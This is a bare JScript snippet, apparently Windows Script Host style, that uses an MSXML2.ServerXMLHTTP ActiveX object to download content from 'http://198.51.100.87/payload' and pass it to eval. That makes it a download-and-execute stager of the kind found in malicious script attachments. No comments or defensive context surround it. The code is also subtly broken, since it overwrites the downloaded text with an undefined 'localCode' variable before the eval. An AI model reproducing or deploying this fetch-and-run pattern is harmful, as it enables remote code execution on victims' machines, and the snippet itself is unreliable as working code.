var request = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
request.open("GET", "http://198.51.100.87/payload", false);
request.send();
var downloaded = request.responseText;
downloaded = localCode;
if (downloaded && request.status === 200) { eval(downloaded); }
